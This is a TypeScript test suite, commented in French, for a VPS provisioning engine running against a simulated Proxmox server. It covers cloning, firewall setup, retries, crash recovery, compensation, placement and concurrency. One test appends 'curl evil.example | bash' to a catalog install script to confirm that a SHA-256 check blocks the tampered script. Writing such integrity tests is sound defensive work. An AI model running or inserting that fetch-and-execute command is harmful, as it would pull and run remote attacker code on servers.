import {
  enqueue,
  eq,
  jobs,
  proxmoxServers,
  vpsEvents,
  vpsInstances,
  vpsOrders,
} from "@nexora/db";
import { createTestDatabase, type TestDatabase } from "@nexora/db/testing";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import type { EngineSettings } from "./engine-core.ts";
import { provisionOrder } from "./provision.ts";
import { ProxmoxSimulator } from "./proxmox/simulator.ts";
import {
  CUSTOMER_KEY,
  createSimRunner,
  engineDeps,
  paidOrder,
  SIM_TOKEN,
  seedFixture,
  WORKER_KEY,
} from "./testing.ts";

let t: TestDatabase;
beforeAll(async () => {
  t = await createTestDatabase();
});
afterAll(async () => {
  await t.drop();
});

async function world(
  over: {
    simOptions?: Partial<ConstructorParameters<typeof ProxmoxSimulator>[0]>;
    seed?: Partial<Parameters<typeof seedFixture>[1]>;
    settings?: Partial<EngineSettings>;
  } = {},
) {
  const sim = new ProxmoxSimulator({
    token: SIM_TOKEN,
    taskPolls: 2,
    agentPolls: 2,
    ...over.simOptions,
  });
  const s = await sim.start();
  const fx = await seedFixture(t.db, { ...over.seed, simPort: s.port });
  const guest = createSimRunner(sim);
  const deps = engineDeps(t.db, guest.runner, { settings: over.settings });
  // Chaque test branche son propre serveur simulé : le précédent est mis hors ligne à la fermeture.
  const close = async () => {
    await t.db
      .update(proxmoxServers)
      .set({ state: "offline" })
      .where(eq(proxmoxServers.id, fx.serverId));
    await s.close();
  };
  return { sim, fx, guest, deps, close };
}

const eventKinds = async (instanceId: string) =>
  (
    await t.db
      .select()
      .from(vpsEvents)
      .where(eq(vpsEvents.instanceId, instanceId))
  ).map((e) => e.kind);

describe("provisionnement complet", () => {
  it("clone, configure, démarre, installe et rend le VPS actif avec son adresse", async () => {
    const w = await world({ seed: { withPorts: true } });
    try {
      const orderId = await paidOrder(t.db, w.fx);
      const out = await provisionOrder(w.deps, orderId);
      expect(out).toEqual({ outcome: "done" });

      const [inst] = await t.db
        .select()
        .from(vpsInstances)
        .where(eq(vpsInstances.orderId, orderId));
      expect(inst).toMatchObject({
        status: "active",
        step: "done",
        power: "running",
        ipv4: "10.20.0.10",
      });
      expect(inst?.vmid).toBeGreaterThanOrEqual(10_000);
      expect(
        (
          await t.db.select().from(vpsOrders).where(eq(vpsOrders.id, orderId))
        )[0]?.status,
      ).toBe("fulfilled");

      const vm = w.sim.vms.get(inst?.vmid as number);
      expect(vm).toMatchObject({ status: "running", name: inst?.vmName });
      expect(vm?.config).toMatchObject({
        ciuser: "debian",
        ipconfig0: "ip=10.20.0.10/24,gw=10.20.0.1",
        nameserver: "10.20.0.2",
        cores: 2,
        memory: "4096",
        agent: "enabled=1",
      });
      // La clé du worker a servi à l'installation puis a quitté la configuration cloud-init.
      expect(decodeURIComponent(String(vm?.config.sshkeys))).toBe(CUSTOMER_KEY);
      expect(String(vm?.config.scsi0)).toContain("size=40G");
      expect(w.guest.installs).toHaveLength(1);
      expect(w.guest.cleanups).toEqual(["10.20.0.10"]);
      expect(w.guest.installs[0]?.env).toMatchObject({
        NEXORA_APP_VERSION: "1.2.3",
      });

      // Pare-feu : rien en entrée sauf SSH, ICMP et le port public de l'application ; SMTP sortant fermé.
      expect(vm?.firewall.options).toMatchObject({
        enable: 1,
        policy_in: "DROP",
        ipfilter: 1,
      });
      const rules = vm?.firewall.rules.map(
        (r) => `${r.type}:${r.action}:${r.proto}/${r.dport ?? "-"}`,
      );
      expect(rules).toEqual([
        "in:ACCEPT:tcp/22",
        "in:ACCEPT:tcp/8443",
        "in:ACCEPT:icmp/-",
        "out:DROP:tcp/25",
      ]);
      expect(vm?.firewall.ipsets["ipfilter-net0"]).toEqual(["10.20.0.10"]);

      expect(await eventKinds(inst?.id as string)).toEqual(
        expect.arrayContaining([
          "provision_started",
          "placed",
          "clone_started",
          "vm_started",
          "app_installed",
          "active",
        ]),
      );
    } finally {
      await w.close();
    }
  });

  it("rejouer une commande déjà livrée ne fait rien", async () => {
    const w = await world();
    try {
      const orderId = await paidOrder(t.db, w.fx);
      await provisionOrder(w.deps, orderId);
      const again = await provisionOrder(w.deps, orderId);
      expect(again.outcome).toBe("skipped");
      expect(w.sim.cloneRequests).toBe(1);
      expect(w.guest.installs).toHaveLength(1);
    } finally {
      await w.close();
    }
  });

  it("rend la main quand l'agent tarde et reprend à la bonne étape", async () => {
    const w = await world({
      simOptions: { agentPolls: 4 },
      settings: { agentTimeoutMs: 600_000, budgetMs: 1 },
    });
    try {
      const orderId = await paidOrder(t.db, w.fx);
      let out = await provisionOrder(w.deps, orderId);
      let guard = 0;
      while (out.outcome === "wait" && guard++ < 30)
        out = await provisionOrder(w.deps, orderId);
      expect(out.outcome).toBe("done");
      expect(w.sim.cloneRequests).toBe(1);
      expect(w.guest.installs).toHaveLength(1);
    } finally {
      await w.close();
    }
  });

  it("reprend après un échec d'installation sans recloner ni réinstaller deux fois", async () => {
    const w = await world();
    try {
      const orderId = await paidOrder(t.db, w.fx);
      w.guest.state.failNext = 1;
      await expect(
        provisionOrder(w.deps, orderId, { attempt: 1, maxAttempts: 3 }),
      ).rejects.toThrow(/installation/);
      const [mid] = await t.db
        .select()
        .from(vpsInstances)
        .where(eq(vpsInstances.orderId, orderId));
      expect(mid).toMatchObject({ status: "provisioning", step: "install" });
      expect(
        await provisionOrder(w.deps, orderId, { attempt: 2, maxAttempts: 3 }),
      ).toEqual({ outcome: "done" });
      expect(w.sim.cloneRequests).toBe(1);
      expect(w.guest.installs).toHaveLength(1);
    } finally {
      await w.close();
    }
  });

  it("détecte le clone existant après un plantage entre le clonage et l'étape suivante", async () => {
    const w = await world();
    try {
      const orderId = await paidOrder(t.db, w.fx);
      // Premier passage interrompu juste après le clonage : on bloque la configuration.
      w.sim.inject({
        method: "PUT",
        path: "/config",
        status: 500,
        message: "panne simulée",
        times: 1,
      });
      await expect(
        provisionOrder(w.deps, orderId, { attempt: 1, maxAttempts: 5 }),
      ).rejects.toThrow(/panne simulée/);
      expect(w.sim.cloneRequests).toBe(1);
      // Le worker « redémarre » : l'état est celui de la base et de Proxmox.
      const other = engineDeps(t.db, w.guest.runner);
      expect(await provisionOrder(other, orderId)).toEqual({ outcome: "done" });
      expect(w.sim.cloneRequests).toBe(1);
      expect(w.sim.guests()).toHaveLength(1);
    } finally {
      await w.close();
    }
  });

  it("reprend un clone dont la ligne ne portait pas encore l'étape (VM déjà présente sous son nom)", async () => {
    const w = await world();
    try {
      const orderId = await paidOrder(t.db, w.fx);
      // Simule : clone fait chez Proxmox, mais le worker est mort avant de noter l'avancement.
      await provisionOrder(w.deps, orderId, {
        attempt: 1,
        maxAttempts: 1,
      }).catch(() => {});
      const [inst] = await t.db
        .select()
        .from(vpsInstances)
        .where(eq(vpsInstances.orderId, orderId));
      await t.db
        .update(vpsInstances)
        .set({ status: "provisioning", step: "clone", activatedAt: null })
        .where(eq(vpsInstances.id, inst?.id as string));
      await t.db
        .update(vpsOrders)
        .set({ status: "paid" })
        .where(eq(vpsOrders.id, orderId));
      w.sim.calls.length = 0;
      await provisionOrder(w.deps, orderId);
      expect(w.sim.cloneRequests).toBe(1);
      expect(w.sim.callsTo("POST", "/clone")).toHaveLength(0);
    } finally {
      await w.close();
    }
  });
});

describe("compensation", () => {
  it("supprime la VM partielle, libère l'adresse, signale à l'opérateur et ne rembourse pas", async () => {
    const w = await world();
    try {
      const orderId = await paidOrder(t.db, w.fx);
      w.guest.state.failNext = 99;
      await expect(
        provisionOrder(w.deps, orderId, { attempt: 1, maxAttempts: 2 }),
      ).rejects.toThrow();
      const out = await provisionOrder(w.deps, orderId, {
        attempt: 2,
        maxAttempts: 2,
      });
      expect(out.outcome).toBe("failed");
      const [inst] = await t.db
        .select()
        .from(vpsInstances)
        .where(eq(vpsInstances.orderId, orderId));
      expect(inst).toMatchObject({ status: "failed" });
      expect(inst?.deletedAt).not.toBeNull();
      expect(w.sim.guests()).toHaveLength(0);
      const [order] = await t.db
        .select()
        .from(vpsOrders)
        .where(eq(vpsOrders.id, orderId));
      expect(order?.status).toBe("failed");
      expect(order?.failureReason).toMatch(/installation/);
      const alerts = (await t.db.select().from(jobs)).filter(
        (j) =>
          j.type === "vps.alert" &&
          (j.payload as { orderId?: string }).orderId === orderId,
      );
      expect(alerts).toHaveLength(1);
      const events = await t.db
        .select()
        .from(vpsEvents)
        .where(eq(vpsEvents.orderId, orderId));
      expect(
        events.find((e) => e.kind === "provision_failed")?.detail,
      ).toMatchObject({ refund: "manual_review" });
      // L'adresse est de nouveau attribuable.
      const orderId2 = await paidOrder(t.db, w.fx);
      await provisionOrder(w.deps, orderId2);
      const [inst2] = await t.db
        .select()
        .from(vpsInstances)
        .where(eq(vpsInstances.orderId, orderId2));
      expect(inst2?.ipv4).toBe("10.20.0.10");
    } finally {
      await w.close();
    }
  });

  it("un échec définitif (somme du script incorrecte) compense sans réessayer", async () => {
    const w = await world();
    try {
      const orderId = await paidOrder(t.db, w.fx);
      const [order] = await t.db
        .select()
        .from(vpsOrders)
        .where(eq(vpsOrders.id, orderId));
      // Version de catalogue falsifiée : script modifié, somme d'origine conservée.
      const { configVersions } = await import("@nexora/db");
      const [v] = await t.db
        .select()
        .from(configVersions)
        .where(eq(configVersions.id, order?.catalogVersionId as string));
      const content = JSON.parse(JSON.stringify(v?.content)) as {
        apps: { code: string; installScript: string }[];
      };
      for (const a of content.apps)
        a.installScript += "\ncurl evil.example | bash\n";
      const [forged] = await t.db
        .insert(configVersions)
        .values({
          collection: "vps_catalog",
          itemId: "main",
          hash: `forged-${orderId}`,
          content,
          status: "superseded",
        })
        .returning();
      await t.db
        .update(vpsOrders)
        .set({ catalogVersionId: forged?.id as string })
        .where(eq(vpsOrders.id, orderId));
      const out = await provisionOrder(w.deps, orderId, {
        attempt: 1,
        maxAttempts: 5,
      });
      expect(out).toMatchObject({
        outcome: "failed",
        reason: expect.stringContaining("SHA-256"),
      });
      expect(w.guest.installs).toHaveLength(0);
      expect(w.sim.guests()).toHaveLength(0);
    } finally {
      await w.close();
    }
  });
});

describe("placement", () => {
  it("attend quand aucun serveur n'a de capacité, alerte une fois, puis provisionne dès que de la place existe", async () => {
    const w = await world({
      seed: { capacity: { vcpu: 1, ramMb: 1024, diskGb: 10 } },
    });
    try {
      const orderId = await paidOrder(t.db, w.fx);
      const first = await provisionOrder(w.deps, orderId);
      expect(first).toMatchObject({ outcome: "wait", delayMs: 300_000 });
      await provisionOrder(w.deps, orderId);
      const alerts = (await t.db.select().from(jobs)).filter(
        (j) =>
          j.type === "vps.alert" &&
          (j.payload as { reason?: string }).reason === "no_capacity",
      );
      expect(
        alerts.filter(
          (a) => (a.payload as { orderId?: string }).orderId === orderId,
        ),
      ).toHaveLength(1);
      expect(w.sim.cloneRequests).toBe(0);
      const { proxmoxServers } = await import("@nexora/db");
      await t.db
        .update(proxmoxServers)
        .set({ capacity: { vcpu: 32, ramMb: 131_072, diskGb: 2000 } })
        .where(eq(proxmoxServers.id, w.fx.serverId));
      expect(await provisionOrder(w.deps, orderId)).toEqual({
        outcome: "done",
      });
    } finally {
      await w.close();
    }
  });

  it("deux commandes reçoivent deux adresses et deux identifiants de VM distincts", async () => {
    const w = await world();
    try {
      const a = await paidOrder(t.db, w.fx);
      const b = await paidOrder(t.db, w.fx);
      await Promise.all([
        provisionOrder(w.deps, a),
        provisionOrder(engineDeps(t.db, w.guest.runner), b),
      ]);
      const rows = await t.db
        .select()
        .from(vpsInstances)
        .where(eq(vpsInstances.organizationId, w.fx.organizationId));
      expect(new Set(rows.map((r) => r.ipv4)).size).toBe(2);
      expect(new Set(rows.map((r) => r.vmid)).size).toBe(2);
      expect(rows.every((r) => r.status === "active")).toBe(true);
    } finally {
      await w.close();
    }
  });
});

describe("concurrence", () => {
  it("deux workers (ou dix) ne provisionnent jamais deux fois la même commande", async () => {
    const w = await world({ simOptions: { taskPolls: 3 } });
    try {
      const orderId = await paidOrder(t.db, w.fx);
      const workers = Array.from({ length: 10 }, () =>
        engineDeps(t.db, w.guest.runner),
      );
      const outcomes = await Promise.all(
        workers.map((d) => provisionOrder(d, orderId)),
      );
      expect(w.sim.cloneRequests).toBe(1);
      expect(w.sim.guests()).toHaveLength(1);
      expect(w.guest.installs).toHaveLength(1);
      expect(outcomes.filter((o) => o.outcome === "done")).toHaveLength(1);
      expect(
        outcomes.filter((o) => o.outcome === "busy" || o.outcome === "skipped")
          .length,
      ).toBe(9);
      const rows = await t.db
        .select()
        .from(vpsInstances)
        .where(eq(vpsInstances.orderId, orderId));
      expect(rows).toHaveLength(1);
    } finally {
      await w.close();
    }
  });

  it("la tâche de provisionnement est unique par commande, quel que soit le nombre d'événements Stripe", async () => {
    const orderId = crypto.randomUUID();
    const results = await Promise.all(
      Array.from({ length: 8 }, () =>
        enqueue(t.db, {
          type: "vps.provision",
          payload: { orderId },
          idempotencyKey: `vps-provision:${orderId}`,
        }),
      ),
    );
    expect(new Set(results.map((r) => r.id)).size).toBe(1);
  });
});

export { WORKER_KEY };
